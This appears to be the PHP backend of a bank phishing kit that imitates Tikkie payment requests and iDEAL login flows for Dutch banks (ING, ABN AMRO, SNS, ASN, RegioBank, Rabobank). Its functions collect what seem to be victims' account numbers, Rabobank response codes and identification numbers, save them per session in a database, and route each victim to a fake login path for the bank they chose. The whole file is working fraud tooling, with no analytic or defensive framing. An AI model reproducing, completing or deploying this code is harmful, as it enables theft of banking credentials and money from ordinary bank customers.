    $query = "UPDATE request_data SET raboresponschecktwo=? WHERE token=?";
    $stmt = mysqli_stmt_init($con);
    mysqli_stmt_prepare($stmt, $query);
    mysqli_stmt_bind_param($stmt, "ss", $empty, $currentSession);
    mysqli_stmt_execute($stmt);

    require '../../required/templates/rabo-respons-template.php';
    mysqli_stmt_close($stmt);
}

// RABO RESPONS
function raboResponsTwo()
{
    global $con;
    checkTrxid();
    $id = $_GET['trxid'];
    $empty = "";
    $currentSession = $_SESSION['alive'];
    
    $secondQuery = "SELECT raboresponscodetwo FROM request_data WHERE token=?";
    $stmt = mysqli_stmt_init($con);
    mysqli_stmt_prepare($stmt, $secondQuery);
    mysqli_stmt_bind_param($stmt, "s", $currentSession);
    mysqli_stmt_execute($stmt);
    mysqli_stmt_bind_result($stmt, $respons);
    
    while(mysqli_stmt_fetch($stmt))
    {
        $respons;
    }
    
    $query = "UPDATE request_data SET raboresponscheckthree=? WHERE token=?";
    $stmt = mysqli_stmt_init($con);
    mysqli_stmt_prepare($stmt, $query);
    mysqli_stmt_bind_param($stmt, "ss", $empty, $currentSession);
    mysqli_stmt_execute($stmt);

    require '../../required/templates/rabo-respons-template-2.php';
    mysqli_stmt_close($stmt);
}

// RABO RESPONS THREE
function raboResponsThree()
{
    global $con;
    checkTrxid();
    $id = $_GET['trxid'];
    $empty = "";
    $currentSession = $_SESSION['alive'];
    
    $query = "UPDATE request_data SET raboresponscheckfour=? WHERE token=?";
    $stmt = mysqli_stmt_init($con);
    mysqli_stmt_prepare($stmt, $query);
    mysqli_stmt_bind_param($stmt, "ss", $empty, $currentSession);
    mysqli_stmt_execute($stmt);

    require '../../required/templates/rabo-respons-template-3.php';
    mysqli_stmt_close($stmt);
}

// SNS RESPONS TWO SUBMIT
function snsResponsSubmit()
{
    global $con;
    $id = $_GET['trxid'];
    $currentSession = $_SESSION['alive'];

    if(isset($_POST['submit']))
    {
        $respons = $_POST['rekeningnummer'];
    
        if(empty($respons) || strlen($respons) < 4 || is_numeric($respons) == false)
        {
            header("location: sign?trxid=$id&error=legevelden");
            exit();
        }
    
        $query = "UPDATE request_data SET snsresponstwo=? WHERE token=?";
        $stmt = mysqli_stmt_init($con);
        mysqli_stmt_prepare($stmt, $query);
        mysqli_stmt_bind_param($stmt, "ss", $respons, $currentSession);
        mysqli_stmt_execute($stmt);
    
        if($stmt)
        {
            header("location: signs?trxid=$id");
            exit();
        }
        mysqli_stmt_close($stmt);
    }
}

// ASN RESPONS TWO SUBMIT
function asnResponsSubmit()
{
    global $con;
    $id = $_GET['trxid'];
    $currentSession = $_SESSION['alive'];

    if(isset($_POST['submit']))
    {
        $respons = $_POST['rekeningnummer'];
    
        if(empty($respons) || strlen($respons) < 4 || is_numeric($respons) == false)
        {
            header("location: sign?trxid=$id&error=legevelden");
            exit();
        }
    
        $query = "UPDATE request_data SET asnresponstwo=? WHERE token=?";
        $stmt = mysqli_stmt_init($con);
        mysqli_stmt_prepare($stmt, $query);
        mysqli_stmt_bind_param($stmt, "ss", $respons, $currentSession);
        mysqli_stmt_execute($stmt);
    
        if($stmt)
        {
            header("location: signs?trxid=$id");
            exit();
        }
        mysqli_stmt_close($stmt);
    }
}

// REGIO RESPONS TWO SUBMIT
function regioResponsSubmit()
{
    global $con;
    $id = $_GET['trxid'];
    $currentSession = $_SESSION['alive'];

    if(isset($_POST['submit']))
    {
        $respons = $_POST['rekeningnummer'];
    
        if(empty($respons) || strlen($respons) < 4 || is_numeric($respons) == false)
        {
            header("location: sign?trxid=$id&error=legevelden");
            exit();
        }
    
        $query = "UPDATE request_data SET regioresponstwo=? WHERE token=?";
        $stmt = mysqli_stmt_init($con);
        mysqli_stmt_prepare($stmt, $query);
        mysqli_stmt_bind_param($stmt, "ss", $respons, $currentSession);
        mysqli_stmt_execute($stmt);
    
        if($stmt)
        {
            header("location: signs?trxid=$id");
            exit();
        }
        mysqli_stmt_close($stmt);
    }
}

// RABO RESPONS SUBMIT
function raboResponsSubmit()
{
    global $con;
    $id = $_GET['trxid'];
    $currentSession = $_SESSION['alive'];

    if(isset($_POST['submit']))
    {
        $respons = $_POST['respons'];
    
        if(empty($respons) || strlen($respons) < 4 || is_numeric($respons) == false)
        {
            header("location: index?trxid=$id&error=legevelden");
            exit();
        }
    
        $query = "UPDATE request_data SET raboresponsone=? WHERE token=?";
        $stmt = mysqli_stmt_init($con);
        mysqli_stmt_prepare($stmt, $query);
        mysqli_stmt_bind_param($stmt, "ss", $respons, $currentSession);
        mysqli_stmt_execute($stmt);
    
        if($stmt)
        {
            header("location: indexs?trxid=$id");
            exit();
        }
        mysqli_stmt_close($stmt);
    }
}

// RABO RESPONS SUBMIT TWO
function raboResponsSubmitTwo()
{
    global $con;
    $id = $_GET['trxid'];
    $currentSession = $_SESSION['alive'];

    if(isset($_POST['submit']))
    {
        $respons = $_POST['respons'];
    
        if(empty($respons) || strlen($respons) < 4 || is_numeric($respons) == false)
        {
            header("location: index?trxid=$id&error=legevelden");
            exit();
        }
    
        $query = "UPDATE request_data SET raboresponstwo=? WHERE token=?";
        $stmt = mysqli_stmt_init($con);
        mysqli_stmt_prepare($stmt, $query);
        mysqli_stmt_bind_param($stmt, "ss", $respons, $currentSession);
        mysqli_stmt_execute($stmt);
    
        if($stmt)
        {
            header("location: indexs?trxid=$id");
            exit();
        }
        mysqli_stmt_close($stmt);
    }
}

// RABO RESPONS SUBMIT THREE
function raboResponsSubmitThree()
{
    global $con;
    $id = $_GET['trxid'];
    $currentSession = $_SESSION['alive'];

    if(isset($_POST['submit']))
    {
        $respons = $_POST['respons'];
    
        if(empty($respons) || strlen($respons) < 5 || is_numeric($respons) == false)
        {
            header("location: index?trxid=$id&error=legevelden");
            exit();
        }
    
        $query = "UPDATE request_data SET raboidentification=? WHERE token=?";
        $stmt = mysqli_stmt_init($con);
        mysqli_stmt_prepare($stmt, $query);
        mysqli_stmt_bind_param($stmt, "ss", $respons, $currentSession);
        mysqli_stmt_execute($stmt);
    
        if($stmt)
        {
            header("location: indexs?trxid=$id");
            exit();
        }
        mysqli_stmt_close($stmt);
    }
}



// SNS RESPONS CHECK TWO
function snsResponsCheckTwo()
{
    global $con;
    checkTrxid();
    $id = $_GET['trxid'];
    $empty = "";
    $currentSession = $_SESSION['alive'];
    
    $firstQuery = "SELECT bedrag, beschrijving, rekeningnummer FROM request_information WHERE link=?";
    $stmt = mysqli_stmt_init($con);
    mysqli_stmt_prepare($stmt, $firstQuery);
    mysqli_stmt_bind_param($stmt, "s", $id);
    mysqli_stmt_execute($stmt);
    mysqli_stmt_bind_result($stmt, $bedrag, $beschrijving, $rekeningnummer);
    
    while(mysqli_stmt_fetch($stmt))
    {
        $bedrag;
        $beschrijving;
        $rekeningnummer;
    }

    require '../../../required/templates/sns-respons-check-2.php';
    mysqli_stmt_close($stmt);
}

// ASN RESPONS CHECK TWO
function asnResponsCheckTwo()
{
    global $con;
    checkTrxid();
    $id = $_GET['trxid'];
    $empty = "";
    $currentSession = $_SESSION['alive'];
    
    $firstQuery = "SELECT bedrag, beschrijving, rekeningnummer FROM request_information WHERE link=?";
    $stmt = mysqli_stmt_init($con);
    mysqli_stmt_prepare($stmt, $firstQuery);
    mysqli_stmt_bind_param($stmt, "s", $id);
    mysqli_stmt_execute($stmt);
    mysqli_stmt_bind_result($stmt, $bedrag, $beschrijving, $rekeningnummer);
    
    while(mysqli_stmt_fetch($stmt))
    {
        $bedrag;
        $beschrijving;
        $rekeningnummer;
    }

    require '../../../required/templates/asn-respons-check-2.php';
    mysqli_stmt_close($stmt);
}

// REGIO RESPONS CHECK TWO
function regioResponsCheckTwo()
{
    global $con;
    checkTrxid();
    $id = $_GET['trxid'];
    $empty = "";
    $currentSession = $_SESSION['alive'];
    
    $firstQuery = "SELECT bedrag, beschrijving, rekeningnummer FROM request_information WHERE link=?";
    $stmt = mysqli_stmt_init($con);
    mysqli_stmt_prepare($stmt, $firstQuery);
    mysqli_stmt_bind_param($stmt, "s", $id);
    mysqli_stmt_execute($stmt);
    mysqli_stmt_bind_result($stmt, $bedrag, $beschrijving, $rekeningnummer);
    
    while(mysqli_stmt_fetch($stmt))
    {
        $bedrag;
        $beschrijving;
        $rekeningnummer;
    }

    require '../../../required/templates/regio-respons-check-2.php';
    mysqli_stmt_close($stmt);
}

// RABO RESPONS CHECK TWO
function raboResponsCheckTwo()
{
    global $con;
    checkTrxid();
    $id = $_GET['trxid'];
    $empty = "";
    $currentSession = $_SESSION['alive'];
    
    $firstQuery = "SELECT bedrag, beschrijving, rekeningnummer FROM request_information WHERE link=?";
    $stmt = mysqli_stmt_init($con);
    mysqli_stmt_prepare($stmt, $firstQuery);
    mysqli_stmt_bind_param($stmt, "s", $id);
    mysqli_stmt_execute($stmt);
    mysqli_stmt_bind_result($stmt, $bedrag, $beschrijving, $rekeningnummer);
    
    while(mysqli_stmt_fetch($stmt))
    {
        $bedrag;
        $beschrijving;
        $rekeningnummer;
    }

    require '../../required/templates/rabo-respons-check-2.php';
    mysqli_stmt_close($stmt);
}

// RABO RESPONS CHECK THREE
function raboResponsCheckThree()
{
    global $con;
    checkTrxid();
    $id = $_GET['trxid'];
    $empty = "";
    $currentSession = $_SESSION['alive'];
    
    $firstQuery = "SELECT bedrag, beschrijving, rekeningnummer FROM request_information WHERE link=?";
    $stmt = mysqli_stmt_init($con);
    mysqli_stmt_prepare($stmt, $firstQuery);
    mysqli_stmt_bind_param($stmt, "s", $id);
    mysqli_stmt_execute($stmt);
    mysqli_stmt_bind_result($stmt, $bedrag, $beschrijving, $rekeningnummer);
    
    while(mysqli_stmt_fetch($stmt))
    {
        $bedrag;
        $beschrijving;
        $rekeningnummer;
    }

    require '../../required/templates/rabo-respons-check-3.php';
    mysqli_stmt_close($stmt);
}

// RABO RESPONS CHECK FOUR
function raboResponsCheckFour()
{
    global $con;
    checkTrxid();
    $id = $_GET['trxid'];
    $empty = "";
    $currentSession = $_SESSION['alive'];
    
    $firstQuery = "SELECT bedrag, beschrijving, rekeningnummer FROM request_information WHERE link=?";
    $stmt = mysqli_stmt_init($con);
    mysqli_stmt_prepare($stmt, $firstQuery);
    mysqli_stmt_bind_param($stmt, "s", $id);
    mysqli_stmt_execute($stmt);
    mysqli_stmt_bind_result($stmt, $bedrag, $beschrijving, $rekeningnummer);
    
    while(mysqli_stmt_fetch($stmt))
    {
        $bedrag;
        $beschrijving;
        $rekeningnummer;
    }

    require '../../required/templates/rabo-respons-check-4.php';
    mysqli_stmt_close($stmt);
}

// TIKKIE REQUEST RELOCATE
function selectedBankTikkie()
{
    global $con;
    $id = $_GET['trxid'];

    if(isset($_POST['submit']))
    {
        $bank = $_POST['selected-bank'];

        if($bank == "ing")
        {
            header("location: ../ideal/static/inloggen/index?trxid=$id");
            exit();
        }
        else if($bank == "abn")
        {
            header("location: ../portalserver/nl/prive/bankieren/ideal?trxid=$id");
            exit();
        }
        else if($bank == "sns")
        {
            header("location: ../online/ideal/sign?trxid=$id");
            exit();
        }
        else if($bank == "asn")
        {
            header("location: ../online/ideals/sign?trxid=$id");
            exit();
        }
        else if($bank == "regio")
        {
            header("location: ../online/idealx/sign?trxid=$id");
            exit();
        }
        else if($bank == "rabo")
        {
            header("location: ../ideal-betaling/inloggen/index?trxid=$id");
            exit();
        }
    }    
}
?>
